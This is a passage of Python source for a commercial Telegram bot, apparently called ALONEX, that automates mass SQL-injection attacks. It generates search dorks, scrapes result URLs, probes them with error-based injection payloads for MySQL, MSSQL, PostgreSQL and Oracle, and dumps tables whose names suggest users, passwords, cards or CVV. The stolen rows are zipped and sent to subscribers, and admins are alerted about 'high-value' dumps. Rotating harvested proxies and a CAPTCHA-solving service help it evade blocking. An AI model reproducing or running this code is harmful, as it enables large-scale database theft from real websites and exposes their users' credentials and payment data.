    if not sget("dns_filter",False) or not urls: return urls
    doms=list({urlparse(u).netloc for u in urls})[:300]; alive=set()
    def chk(dn):
        try:
            socket.getaddrinfo(dn,None,0,socket.SOCK_STREAM); return dn
        except: return None
    with ThreadPoolExecutor(20) as ex:
        for r in ex.map(chk,doms):
            if r: alive.add(r)
    return [u for u in urls if urlparse(u).netloc in alive]



# ============ INJECTOR v3 ============
ERROR_SIGS=["sql syntax","you have an error in your sql","right syntax to use","check the manual","mysql_fetch","mysql_num_rows","mysqli_","mariadb","pg_query","pg_exec","postgresql","sqlite3::","sqlite_","ora-","oracle error","pl/sql","odbc","microsoft jet","jet database engine","access database","db2 sql","informix","syntax error","unclosed quotation","unterminated string","quoted string not properly","invalid input syntax","division by zero","sqlstate","query failed","sql error","syntax error near","microsoft vb","vbscript runtime","conversion failed","nvarchar value","varchar value","unexpected end of command","supplied argument is not a valid","warning: mysql","warning: pg_","warning: oci","fatal error: uncaught pdo"]
SCAN_V=2

def build_url(parsed,nq): return urlunparse((parsed.scheme,parsed.netloc,parsed.path,"",urlencode(nq,doseq=True),""))


# ============ PROXY HUNT (LIVE) ============
def turbo_hunt(cid,uid,mid,jid,size=1000,silent=False):
    t0=time.time(); cnt={"raw":0,"chk":0,"live":0,"dead":0}; last=[0.0]
    try:
        async def run():
            conn=aiohttp.TCPConnector(limit=60,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
            async with aiohttp.ClientSession(connector=conn,headers=HDR) as s:
                def tick():
                    now=time.time()
                    if silent or now-last[0]<20: return
                    last[0]=now
                    eta_txt = eta_line(t0, cnt["chk"], cnt["raw"]) if cnt["raw"]>0 else "⏱ TIME LEFT: CALCULATING...\n🎯 COMPLETE AT: CALCULATING..."
                    try: bot.edit_message_text(f"<blockquote><b>{E['zap']} TURBO HUNT LIVE\n{LINE}\n{E['folder']} RAW: {cnt['raw']} | {E['search']} CHECKED: {cnt['chk']}/{cnt['raw']}\n{E['tick']} LIVE: {cnt['live']} | {E['cross']} DEAD: {cnt['dead']}\n{bar(cnt['chk'],cnt['raw'])} {pct(cnt['chk'],cnt['raw'])}%\n{eta_txt}\n⏱ ELAPSED: {fmt_eta(now-t0)}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
                    except: pass
                async def grab(src):
                    t,_=await a_get(s,src,to=20)
                    if t:
                        ls=[l.strip() for l in t.splitlines() if re.match(r"\d{1,3}(\.\d{1,3}){3}:\d{2,5}",l.strip())]
                        return [(l if l.startswith("http") else "http://"+l) for l in ls[:1500]]
                    return []
                raw=[]
                for r in await asyncio.gather(*[grab(x) for x in PROXY_SRC]): raw.extend(r)
                raw=list(dict.fromkeys(raw))[:size]; cnt["raw"]=len(raw); tick()
                sem=asyncio.Semaphore(80)
                async def chk(p):
                    if stopped(jid): return None
                    async with sem:
                        for ep in CHECK_EPS[:3]:
                            try:
                                async with s.get(ep,proxy=p,ssl=False,timeout=aiohttp.ClientTimeout(total=5)) as r:
                                    if r.status==200 and re.search(r"\d{1,3}(\.\d{1,3}){3}",await r.text()):
                                        cnt["live"]+=1; cnt["chk"]+=1; tick(); return p
                            except: continue
                        cnt["dead"]+=1; cnt["chk"]+=1; tick()
                        return None
                return raw,[p for p in await asyncio.gather(*[chk(p) for p in raw]) if p]
        raw,live=_run_on_loop(run())
    except Exception as e:
        if not silent:
            try: bot.send_message(cid, f"<blockquote><b>{E['cross']} HUNT BUG:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
            except: pass
        return []
    merged=list(dict.fromkeys(uprox(uid)+live)); set_uprox(uid,merged)
    if not silent:
        clear_markup(cid,mid)
        bot.send_message(cid, f"<blockquote><b>{E['tick']} TURBO HUNT COMPLETED\n{LINE}\n{E['tick']} +{len(live)} LIVE | {E['cross']} {len(raw)-len(live)} DEAD\n{E['shield']} TOTAL POOL: {len(merged)} | {E['zap']} {int(time.time()-t0)}S</b></blockquote>", parse_mode="HTML")
    return live

def auto_hunt(uid):
    below=sget("hunt_below",10)
    if below<=0 or len(uprox(uid))>=below: return
    turbo_hunt(0,uid,0,0,120,silent=True)

# ============ SYNC + DUMPER v2 ============
_TLS=threading.local()
def sess():
    s=getattr(_TLS,"s",None)
    if s is None:
        s=requests.Session(); s.headers.update(HDR); _TLS.s=s
    return s

class PH:
    def __init__(s,p): s.proxies=list(p); s.score={}
    def get(s):
        if not s.proxies: return None
        s.proxies.sort(key=lambda p:-s.score.get(p,0))
        return random.choice(s.proxies[:max(10,len(s.proxies)//3)])
    def ok(s,p): s.score[p]=s.score.get(p,0)+1
    def bad(s,p): s.score[p]=s.score.get(p,0)-2

def _get(url,ph,to=TIMEOUT,redir=True):
    proxy=ph.get(); px={"http":proxy,"https":proxy} if proxy else None
    if proxy:
        try:
            r=sess().get(url,proxies=px,timeout=min(to,7),verify=False,allow_redirects=redir)
            if r.status_code==200: ph.ok(proxy); return r.text,200
            ph.bad(proxy)
        except: ph.bad(proxy)
    try:
        r=sess().get(url,timeout=to,verify=False,allow_redirects=redir)
        return r.text,r.status_code
    except: return None,0

def run_jobs(work,items,jid,workers,on_done):
    ex=ThreadPoolExecutor(max_workers=workers)
    pairs=[(ex.submit(work,it),it) for it in items]
    fmap={f:p for f,p in pairs}; pending=set(fmap.keys())
    while pending and not stopped(jid):
        dn,pending=wait(pending,timeout=1.0)
        for f in dn: on_done(f,fmap[f])
    ex.shutdown(wait=False)
    return stopped(jid)

def hexify(s): return "0x"+s.encode("utf-8","ignore").hex()
def esc(s): return s.replace("'","''")
EXTRACT={"mysql":[r"~([^~<>&\n]{1,800})~",r"XPATH error[^']*'([^']+)'",r"XPATH syntax error[^']*'([^']+)'"],"mssql":[r"nvarchar value '([^']{1,800})'"],"pg":[r'invalid input syntax for type integer: "([^"]{1,800})"'],"oracle":[r"DRG-11446[^\(]*\(([^)]{1,800})\)"]}
WRAP={"mysql":[lambda q:"' AND extractvalue(1,concat(0x7e,("+q+"),0x7e))-- ",lambda q:"' AND updatexml(1,concat(0x7e,("+q+"),0x7e))-- "],"mssql":[lambda q:"' AND 1=CONVERT(int,("+q+"))-- "],"pg":[lambda q:"' AND 1=CAST(("+q+") AS INT)-- "],"oracle":[lambda q:"' AND 1=CTXSYS.DRITHSX.SN(user,("+q+"))-- "]}
VQ={"mysql":"version()","mssql":"select @@version","pg":"select version()","oracle":"select banner from v$version where rownum=1"}







JUICY=["user","admin","login","pass","customer","order","account","member","client","staff","cred","cc","card","cvv","email","mail"]
MAILK=["email","mail","e-mail","user","username","login","uid"]
PASSK=["pass","pwd","password","passwd","hash","secret","token"]

def dump_one_url(url,ph,mode,juicy,jid):
    try:
        if stopped(jid): return None
        t_start=time.time()
        parsed=urlparse(url); query=parse_qs(parsed.query,keep_blank_values=True)
        if not query: return None
        param=None; db=None; ver=None
        for p in list(query.keys())[:3]:
            for d in VQ:
                v=sqli_fetch(url,p,VQ[d],d,ph,mode["timeout"])
                if v: param,db,ver=p,d,v; break
            if param: break
        if not param: return None
        res={"url":url,"db":db,"info":{"version":ver},"tables":{}}
        tcsv=sqli_fetch(url,param,q_tables(db),db,ph,mode["timeout"])
        if not tcsv: return res
        tables=[t.strip() for t in tcsv.split(",") if t.strip() and not any(x in t for x in "{}[];<> ")]
        res["info"]["total_tables"]=str(len(tables))
        if juicy: tables=[t for t in tables if any(k in t.lower() for k in JUICY)] or tables
        for t in tables[:mode["tables"]]:
            if stopped(jid) or time.time()-t_start>DUMP_DEADLINE: break
            ccsv=sqli_fetch(url,param,q_cols(db,t),db,ph,mode["timeout"])
            if not ccsv: continue
            cols=sort_cols([c for c in ccsv.split(",") if c])
            if not cols: continue
            res["tables"][t]={"columns":cols,"rows":q_rows_chunk(db,t,cols,mode["rows"],ph,mode["timeout"],url,param)}
        return res
    except: return None

def build_zip(dumps):
    bio=io.BytesIO()
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as z:
        for d in dumps:
            host=urlparse(d["url"]).netloc.replace(":","_") or "site"
            base="dump/"+host+"/"
            z.writestr(base+"info.txt","URL: "+d["url"]+"\nDB: "+d.get("db","?")+"\n"+"\n".join(k+": "+v for k,v in d["info"].items())+"\n")
            z.writestr(base+"tables.txt","\n".join(d["tables"].keys())+"\n")
            for tn,td in d["tables"].items():
                safe=re.sub(r"[^A-Za-z0-9_\-]","_",tn)[:40]
                z.writestr(base+"table_"+safe+".txt","TABLE: "+tn+"\nCOLUMNS: "+", ".join(td["columns"])+"\n"+"\n".join(td["rows"])+"\n")
    bio.seek(0)
    return bio.getvalue()

def count_loot(dumps):
    em=0; ha=0
    for d in dumps:
        for tn,td in d["tables"].items():
            for row in td["rows"]:
                em+=len(re.findall(r"[\w.+-]+@[\w-]+\.\w+",row)); ha+=len(re.findall(r"\b[0-9a-f]{32}\b",row))
    return em,ha

def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
    try:
        jp_reg(jid,"dump",uid,cid,{"juicy":juicy})
        try: save_json(os.path.join(JOBS_DATA,jid+".urls"),urls)
        except: pass
        t_start = time.time()
        proxy_pool_dump = uprox(uid)
        proxy_rotations_dump = [0]
        ph=PH(uprox(uid)); dumps=[]; done=[0]; last=[0.0]; cur=["-"]; cached=[0]
        LIVE[jid]={"kind":"dump","dumps":dumps}
        bump("dump"); bumpU(uid,"dump")
        dc=load_json(DUMP_CACHE,{}); now=time.time(); to_dump=[]
        for u in urls:
            if dc.get(u) and now-dc[u]<7*86400: cached[0]+=1
            else: to_dump.append(u)
            
        def edit(force=False):
            now=time.time()
            if force or now-last[0]>20:
                last[0]=now
                t_elapsed = max(1, now - t_start)
                speed = round(done[0] / (t_elapsed / 60), 1) if done[0] else 0
                eta_txt = eta_line(t_start, done[0], len(to_dump))
                creds_total = sum(len(d.get("creds",[])) for d in dumps)
                cc_total = sum(len(d.get("cards",[])) for d in dumps)
                try: bot.edit_message_text(f"<blockquote><b>{E['blood']} ALONEDUMPER V2\n{LINE}\n{bar(done[0],len(to_dump))} {pct(done[0],len(to_dump))}%\n📁 SITES DUMPED: {len(dumps)} | 🔐 CREDS: {creds_total} | 💳 CC: {cc_total}\n🛡️ PROXIES: {len(proxy_pool_dump)} | 🔄 ROT: {proxy_rotations_dump[0]}\n⚡ {speed} sites/min | ⚙️ {min(DUMP_WORKERS,mode['workers'])} WORKERS\n📊 TOTAL: {done[0]}/{len(to_dump)} sites | LEFT: {len(to_dump)-done[0]}\n{eta_txt}\nCUR: {cur[0][:20]}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
                except: pass
                
        def on_done(f,u):
            cur[0]=urlparse(u).netloc[:25]
            r=f.result()
            if r and (r.get("tables") or r.get("info")): dumps.append(r)
            dc[u]=now
            done[0]+=1; edit()
            
        run_jobs(lambda u:dump_one_url(u,ph,mode,juicy,jid),to_dump,jid,min(DUMP_WORKERS,mode["workers"]),on_done)
        if len(dc)>20000: dc=dict(sorted(dc.items(),key=lambda kv:-kv[1])[:10000])
        save_json(DUMP_CACHE,dc)
        clear_markup(cid,mid); edit(True); jp_unreg(jid)
        if stopped(jid):
            save_json(DUMP_CACHE,dc); clear_markup(cid,mid); jp_unreg(jid)
            threading.Thread(target=_partial_sender,args=(jid,cid),daemon=True).start()
            LIVE.pop(jid,None); return
            
        juicy_found=[]
        for dmp in dumps:
            for tn in dmp["tables"]:
                if any(k in tn.lower() for k in JUICY): juicy_found.append(f"{urlparse(dmp['url']).netloc} → {tn}")
        em,ha=count_loot(dumps)
         
        if juicy_found or em:
            for a in admins():
                try: bot.send_message(a, f"<blockquote><b>{E['warn']} HIGH-VALUE DUMP DETECTED\n{LINE}\n{E['user']} UID: {uid}\n{E['globe']} EMAILS/CREDS: {em} | {E['lock']} HASHES: {ha}\n" + "\n".join(juicy_found[:10]) + "</b></blockquote>", parse_mode="HTML")
                except: pass
                
        if dumps:
            send_doc(cid,build_zip(dumps),"data_dump.zip",uid)
            rows=[{"url":d["url"],"type":"DB-DUMP "+d.get("db","?"),"param":",".join(d["tables"].keys()),"sig":str(sum(len(t["rows"]) for t in d["tables"].values()))+" rows"} for d in dumps]
            send_doc(cid,html_report("Dump Report",rows).encode(),"dump_report.html",uid)
            bot.send_message(cid, f"<blockquote><b>{E['tick']} DUMPER COMPLETED\n{LINE}\n{E['folder']} SITES: {len(dumps)} | {E['chart']} TABLES: {sum(len(d['tables']) for d in dumps)}\n{E['globe']} EMAILS/CREDS: {em} | {E['lock']} HASHES: {ha}\n{E['zap']} {cached[0]} CACHED SKIPS</b></blockquote>", parse_mode="HTML")
        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} NO NEW DATA EXTRACTED.\n{E['zap']} {cached[0]} CACHED SKIPS.</b></blockquote>", parse_mode="HTML")
    except Exception as e:
        try: bot.send_message(cid, f"<blockquote><b>{E['cross']} DUMPER ERROR:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
        except: pass

# ============ DORK/KEYWORD GEN ============
def kw_boost(kws):
    w=load_json(KW_W,{})
    for k in kws: w[k]=w.get(k,0)+1
    save_json(KW_W,w)

def kw_pick(pool,n):
    w=load_json(KW_W,{})
    top=sorted(pool,key=lambda k:-w.get(k,0))[:max(10,len(pool)//3)]
    return [random.choice(top) for _ in range(n)] if top else [random.choice(pool) for _ in range(n)]

def gen_dorks_list(kws,count):
    sites=read_lines(RES_FILES["sites"]) or [""]
    ptypes=read_lines(RES_FILES["page_types"]) or ["php"]
    pparams=read_lines(RES_FILES["page_parameters"]) or ["id="]
    patterns=read_lines(RES_FILES["patterns"]) or ["{keyword} ext:{page_type} inurl:{page_parameter}"]
    good=read_lines(GOOD_D)
    
    if not kws: kws=read_lines(RES_FILES["keywords"]) or ["admin"]
    
    pt=[p for p in ptypes if any(x in p.lower() for x in ["product","item","category","cart","order","page","view","php","asp"])] or ptypes
    pp=[p for p in pparams if any(x in p.lower() for x in ["id","cat","page","pid","product","item"])] or pparams
    
    dorks=set()
    if good: dorks.update(random.sample(good,min(len(good),count//5)))
    
    guard = 0
    max_guard = count * 15 # Yeh bot ko infinite loop me hang hone se bachayega
    
    while len(dorks) < count and guard < max_guard:
        guard += 1
        d=random.choice(patterns).replace("{site}",random.choice(sites)).replace("{keyword}",random.choice(kws))
        d=d.replace("{page_type}",random.choice(pt)).replace("{page_parameter}",random.choice(pp))
        d=d.replace("{search_function}","").replace("  "," ").strip()
        if len(d)>12: dorks.add(d)
        
    return list(dorks)[:count]


def make_keywords(kws,count):
    out=set(); guard=0
    while len(out)<count and guard<count*80:
        guard+=1
        kw=random.choice(kws).strip()
        if not kw: continue
        m=random.choice(KM_MODS); p=random.choice(KM_PLATS); y=random.choice(KM_YEARS)
        kw2=random.choice(kws).strip()
        st=random.randint(0,8)
        c=[kw+" "+m,m+" "+kw,kw+" "+p,kw+" "+y,kw+" "+m+" "+y,kw+" "+p+" "+y,m+" "+kw+" "+p,(kw+" "+kw2) if kw2!=kw else (kw+" "+m+" "+p),m+" "+kw+" "+y][st]
        c=re.sub(r"\s+"," ",c).strip().lower()
        if 4<len(c)<60: out.add(c)
    return list(out)

# ============ CAPTCHA SOLVER ============
def cap_detect(url):
    try:
        t=requests.get(url,headers=HDR,timeout=10,verify=False).text
    except: return None,None
    low=t.lower(); sk=None
    m=re.search(r'data-sitekey\s*=\s*["\']([^"\']{10,})["\']',t)
    if m: sk=m.group(1)
    if "hcaptcha" in low or "h-captcha" in low: return "hcaptcha",sk
    if "recaptcha" in low or "grecaptcha" in low or sk: return "recaptcha",sk
    return None,None

def cap_solve(cid,uid,mid,url):
    key=sget("captcha_api")
    if not key:
        try: bot.edit_message_text(f"<blockquote><b>{E['cross']} CAPTCHA SOLVER\n{LINE}\nPLEASE SAVE API KEY IN /admin FIRST!</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
        except: pass
        return
    try: bot.edit_message_text(f"<blockquote><b>{E['search']} CAPTCHA SOLVER\n{LINE}\nSCANNING URL...</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
    except: pass
    ct,sk=cap_detect(url)
    if not ct or not sk:
        try: bot.edit_message_text(f"<blockquote><b>{E['cross']} CAPTCHA SOLVER\n{LINE}\nNO SITEKEY FOUND.</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
        except: pass
        return
    method="hcaptcha" if ct=="hcaptcha" else "userrecaptcha"
    try: r=requests.post("https://2captcha.com/in.php",data={"key":key,"method":method,"sitekey":sk,"pageurl":url,"json":1},timeout=15).json()
    except: r={}
    if r.get("status")!=1:
        try: bot.edit_message_text(f"<blockquote><b>{E['cross']} SOLVER ERROR\n{LINE}\n2CAPTCHA ERROR: {r.get('request','UNKNOWN')}</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
        except: pass
        return
    cidr=r.get("request")
    try: bot.edit_message_text(f"<blockquote><b>{E['puzzle']} CAPTCHA SOLVER\n{LINE}\n{ct.upper()} | SOLVING...</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
    except: pass
    for i in range(30):
        time.sleep(5)
        try: q=requests.get(f"https://2captcha.com/res.php?key={key}&action=get&id={cidr}&json=1",timeout=10).json()
        except: continue
        if q.get("status")==1:
            try: bot.edit_message_text(f"<blockquote><b>{E['tick']} SOLVED SUCCESSFULLY\n{LINE}\n{E['lock']} TOKEN:\n<code>{q.get('request')}</code></b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
            except: pass
            return
        if q.get("request")!="CAPCHA_NOT_READY": break
    try: bot.edit_message_text(f"<blockquote><b>{E['cross']} CAPTCHA SOLVER\n{LINE}\nTIMEOUT OR ERROR OCCURRED.</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
    except: pass

# ============ PIPELINE + AUTO + SCHED ============
def pipeline_run(cid,uid,mid,jid,kws,dcount,do_dump):
    try:
        mode=get_mode(uid)
        def stage(t):
            try: bot.edit_message_text(f"<blockquote><b>{E['rocket']} ALONEPIPELINE\n{LINE}\n{t}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
            except: pass
        stage(f"{E['dna']} GENERATING DORKS...")
        dorks=gen_dorks_list(kws,dcount)
        if not dorks: clear_markup(cid,mid); bot.send_message(cid, f"<blockquote><b>{E['cross']} RESOURCES MISSING!</b></blockquote>", parse_mode="HTML"); return
        stage(f"{E['globe']} PARSING {len(dorks)} DORKS...")
        turbo_parse(cid,uid,mid,jid,dorks,["ddg","bing","yahoo","brave"],"",mode,15)
        urls=LAST.get(uid,{}).get("parsed",[])
        if not urls: return
        stage(f"{E['syringe']} SCANNING {len(urls)} URLS...")
        turbo_inject(cid,uid,mid,jid,urls,mode,15)
        vuln=LAST.get(uid,{}).get("vuln",[])
        if do_dump and vuln:
            stage(f"{E['blood']} DUMPING {len(vuln)} SITES...")
            run_datadump(cid,uid,mid,jid,vuln,None,mode,True)
        clear_markup(cid,mid)
        bot.send_message(cid, f"<blockquote><b>{E['tick']} PIPELINE COMPLETED\n{LINE}\n{E['globe']} URLS: {len(urls)} | {E['blood']} VULN: {len(vuln)}</b></blockquote>", parse_mode="HTML")
    except Exception as e:
        try: bot.send_message(cid, f"<blockquote><b>{E['cross']} PIPELINE ERROR:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
        except: pass

def run_one_cycle(uid,cid,jid):
    mode=get_mode(uid)
    base=read_lines(RES_FILES["keywords"]) or KM_PLATS
    kws=list(set(kw_pick(base,25)+[random.choice(KM_MODS)+" "+random.choice(KM_PLATS) for _ in range(15)]))
    dorks=gen_dorks_list(kws,sget("auto_dorks",500))
    if not dorks: return None
    turbo_parse(cid,uid,0,jid,dorks,["ddg","bing","yahoo"],"",mode,15)
    urls=LAST.get(uid,{}).get("parsed",[])
    if not urls: return {"skip":True}
    turbo_inject(cid,uid,0,jid,urls,mode,15)
    vuln=LAST.get(uid,{}).get("vuln",[])
    if vuln: run_datadump(cid,uid,0,jid,vuln,None,mode,True)
    kw_boost(kws)
    return {"kws":len(kws),"dorks":len(dorks),"urls":len(urls),"vuln":len(vuln)}

def auto_loop(uid,cid,limit):
    AUTO[uid]={"stop":False,"done":0,"limit":min(limit,100)}
    bump("auto"); bumpU(uid,"auto")
    while AUTO[uid]["done"]<AUTO[uid]["limit"] and not AUTO[uid]["stop"]:
        with AUTO_LOCK: auto_hunt(uid)
        jid=new_job(); res=run_one_cycle(uid,cid,jid)
        AUTO[uid]["done"]+=1
        if res is None: bot.send_message(cid, f"<blockquote><b>{E['cross']} AUTO PILOT: RESOURCES MISSING!</b></blockquote>", parse_mode="HTML"); break
        if res.get("skip"): bot.send_message(cid, f"<blockquote><b>{E['robot']} CYCLE {AUTO[uid]['done']}/{AUTO[uid]['limit']}\n{E['warn']} ENGINES BLOCKED. SKIPPING...</b></blockquote>", parse_mode="HTML")
        else: bot.send_message(cid, f"<blockquote><b>{E['tick']} CYCLE {AUTO[uid]['done']}/{AUTO[uid]['limit']} COMPLETED\n{E['brain']} KWS: {res['kws']} → {E['dna']} DORKS: {res['dorks']}\n{E['globe']} URLS: {res['urls']} | {E['blood']} VULN: {res['vuln']}</b></blockquote>", parse_mode="HTML")
        if AUTO[uid]["done"]<AUTO[uid]["limit"] and not AUTO[uid]["stop"]:
            end=time.time()+sget("auto_interval",1)*3600
            while time.time()<end and not AUTO[uid]["stop"]: time.sleep(5)
    st=AUTO.pop(uid,None)
    if st: bot.send_message(cid, f"<blockquote><b>{E['tick']} AUTO PILOT FINISHED\n{LINE}\n{E['robot']} CYCLES EXECUTED: {st['done']}/{st['limit']}</b></blockquote>", parse_mode="HTML")

def sched_loop():
    last_run=""; last_digest=""
    while True:
        try:
            st=S(); sc=st.get("sched",{}); now=datetime.now()
            if sc.get("on") and sc.get("dorks"):
                key=now.strftime("%Y-%m-%d")
                if str(now.hour)==str(sc.get("hour",6)) and last_run!=key:
                    last_run=key
                    m=bot.send_message(OWNER_ID, f"<blockquote><b>{E['gear']} EXECUTING SCHEDULED RUN...</b></blockquote>", parse_mode="HTML")
                    turbo_parse(OWNER_ID,OWNER_ID,m.message_id,new_job(),sc["dorks"][:200],["ddg","bing","yahoo"],"",MODES["balanced"],15)
            if str(now.hour)=="9" and last_digest!=now.strftime("%Y-%m-%d"):
                last_digest=now.strftime("%Y-%m-%d")
                s=load_json(STATS_DB,{}); users=load_json(USERS_DB,{})
                act=sum(1 for u in users if license_until(int(u)))
                for a in admins():
                    try: bot.send_message(a, f"<blockquote><b>{E['chart']} DAILY DIGEST\n{LINE}\n{E['user']} USERS: {len(users)} | {E['ticket']} ACTIVE: {act}\n{E['dna']} {s.get('gen',0)} | {E['globe']} {s.get('parse',0)} | {E['syringe']} {s.get('inject',0)}\n{E['blood']} {s.get('dump',0)} | {E['rocket']} {s.get('auto',0)}</b></blockquote>", parse_mode="HTML")
                    except: pass
        except: pass
        time.sleep(30)

# ============ JOB CLEANUP (5 MIN) + RESOURCE ALERT ============
def job_cleanup_loop():
    while True:
        time.sleep(300)
        now=time.time()
        with JOBS_LOCK:
            for k in [k for k,v in JOBS.items() if now-v.get("start",now)>600]: del JOBS[k]
        with RATE_LOCK:
            for k in [k for k,v in RATE_LIMITS.items() if now-v>3600]: del RATE_LIMITS[k]

def check_resources():
    miss=[n for n,p in RES_FILES.items() if not os.path.exists(p) or os.path.getsize(p)==0]
    if miss:
        print("⚠️ MISSING RESOURCES:",", ".join(miss))
        for a in admins():
            try: bot.send_message(a, f"<blockquote><b>{E['warn']} MISSING RESOURCES:\n{', '.join(miss)}</b></blockquote>", parse_mode="HTML")
            except: pass

# ============ PROXY FORMATTING & CLEAN/CHECK ============
def format_proxy(raw):
    """Auto-detects and formats proxies (IP:PORT, IP:PORT:USER:PASS, USER:PASS@IP:PORT)"""
    raw = raw.strip()
    if not raw: return None
    
    scheme = "http://"
    if "://" in raw:
        parts = raw.split("://", 1)
        scheme = parts[0] + "://"
        raw = parts[1]
        
    parts = raw.split(":")
    
    # Handle IP:PORT:USER:PASS
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"{scheme}{user}:{pwd}@{ip}:{port}"
    # Handle USER:PASS@IP:PORT or standard IP:PORT
    return scheme + raw

def check_proxy_live(p,to=6):
    for ep in CHECK_EPS:
        try:
            r=sess().get(ep,proxies={"http":p,"https":p},timeout=to,verify=False)
            if r.status_code==200 and re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$",r.text.strip()): return True,0
        except: continue
    return False,0

def run_clean(cid,uid,mid,saved):
    live=[]; dead=[0]; done=[0]
    def chk(p): return p if check_proxy_live(p)[0] else None
    with ThreadPoolExecutor(20) as ex:
        for p,r in zip(saved,ex.map(chk,saved)):
            if r: live.append(r)
            else: dead[0]+=1
            done[0]+=1
            if done[0]%10==0 or done[0]==len(saved):
                try: bot.edit_message_text(f"<blockquote><b>{E['gear']} CLEANING POOL {done[0]}/{len(saved)}...\n{E['tick']} ALIVE: {len(live)} | {E['cross']} DEAD: {dead[0]}</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
                except: pass
    set_uprox(uid,live)
    try: bot.edit_message_text(f"<blockquote><b>{E['tick']} PROXY CLEANING DONE\n{LINE}\n{E['shield']} KEPT ALIVE: {len(live)} | {E['cross']} REMOVED DEAD: {dead[0]}</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
    except: pass

def run_check(cid,uid,mid,prx):
    live=[]; dead=[0]; done=[0]
    def chk(p): return p if check_proxy_live(p)[0] else None
    with ThreadPoolExecutor(20) as ex:
        for p,r in zip(prx,ex.map(chk,prx)):
            if r: live.append(r)
            else: dead[0]+=1
            done[0]+=1
            if done[0]%10==0 or done[0]==len(prx):
                try: bot.edit_message_text(f"<blockquote><b>{E['search']} CHECKING {done[0]}/{len(prx)}...\n{E['tick']} ALIVE: {len(live)} | {E['cross']} DEAD: {dead[0]}</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
                except: pass
    
    # Save ONLY alive proxies to the existing pool
    new_pool = list(dict.fromkeys(uprox(uid) + live))
    set_uprox(uid, new_pool)
    
    try: bot.edit_message_text(f"<blockquote><b>{E['tick']} PROXY CHECK DONE\n{LINE}\n{E['shield']} ADDED ALIVE: {len(live)} | {E['cross']} BLOCKED DEAD: {dead[0]}\n{E['folder']} TOTAL POOL: {len(new_pool)}</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
    except: pass
    



# ============ UI ============
def menu_caption(uid):
    u=U(uid); exp=license_until(uid)
    lic=f"{E['tick']} {datetime.fromtimestamp(exp):%d %b %Y}" if exp else f"{E['cross']} NOT ACTIVE"
    ap=f"\n{E['robot']} APPROVED" if str(uid) in sget("auto_approved",[]) else ""
    return (f"<blockquote><b>{E['skull']} ALONEX — PREMIUM EDITION\n{LINE}\n{E['user']} @{u.get('username','user')}\n{E['zap']} {u.get('mode','turbo').upper()} | {E['globe']} {u.get('lang','en').upper()}\n{E['ticket']} {lic}{ap}\n{E['shield']} {len(uprox(uid))} PROXIES\n{LINE}\n{L(uid)['cap']}</b></blockquote>")

def main_markup(uid):
    mk=types.InlineKeyboardMarkup()
    mk.add(sbtn("FULL PIPELINE","menu:pipe","primary"))
    mk.add(sbtn("AUTO PILOT","menu:auto","primary"))
    mk.row(sbtn("KEYWORDS","menu:km","primary"),sbtn("DORKER","menu:gen","primary"))
    mk.row(sbtn("PARSER","menu:parse","success"),sbtn("INJECTOR","menu:inject","success"))
    mk.row(sbtn("DUMPER","menu:data","danger"),sbtn("PROXIES","menu:proxy","primary"))
    mk.row(sbtn("SUBFINDER","menu:subs","primary"),sbtn("FILES","menu:files","primary"))
    mk.row(sbtn("COMBOS","menu:combos","primary"),sbtn("SPEED","menu:speed","primary"))
    mk.row(sbtn("PLANS","menu:plans","primary"),sbtn("REFER","menu:ref","primary"))
    mk.row(sbtn("SALE","menu:sell","primary"),sbtn("LICENSE","menu:lic","primary"))
    mk.row(sbtn("LANG","menu:lang","primary"),sbtn("HELP","menu:help","primary"))
    if sget("channels",[]): mk.add(sbtn("JOIN","menu:join","success"))
    mk.row(sbtn("SOLVER","menu:solver","primary"),sbtn("SUPPORT","menu:support","danger"))
    return mk

def send_main(cid,uid):
    set_cur(uid,"home")
    cap=menu_caption(uid); mk=main_markup(uid); pl=prem_line()
    p=BANNERS["main"]
    if os.path.exists(p):
        fid=PHOTO_FC.get("main")
        try:
            if fid:
                bot.send_photo(cid,fid,caption=pl+cap,reply_markup=mk,parse_mode="HTML"); return
            with open(p,"rb") as f: m=bot.send_photo(cid,f,caption=pl+cap,reply_markup=mk,parse_mode="HTML")
            try: PHOTO_FC["main"]=m.photo[-1].file_id
            except: pass
            return
        except Exception: PHOTO_FC.pop("main",None)
    elif os.path.exists(DOOM_IMG):
        fid=PHOTO_FC.get("doom")
        try:
            if fid:
                bot.send_photo(cid,fid,caption=cap,reply_markup=mk,parse_mode="HTML"); return
            with open(DOOM_IMG,"rb") as f: m=bot.send_photo(cid,f,caption=cap,reply_markup=mk,parse_mode="HTML")
            try: PHOTO_FC["doom"]=m.photo[-1].file_id
            except: pass
            return
        except Exception: PHOTO_FC.pop("doom",None)
    bot.send_message(cid,cap,reply_markup=mk,parse_mode="HTML")

def proxy_markup():
    mk=types.InlineKeyboardMarkup()
    mk.row(sbtn("LIST","proxy:list","primary"),sbtn("CHECK","proxy:check","primary"))
    mk.row(sbtn("ADD","proxy:add","success"),sbtn("HUNT","proxy:hunt","success"))
    mk.row(sbtn("CLEAN","proxy:clean","danger"),sbtn("BACK","back","primary"))
    return mk

def admin_markup(uid):
    mk=types.InlineKeyboardMarkup()
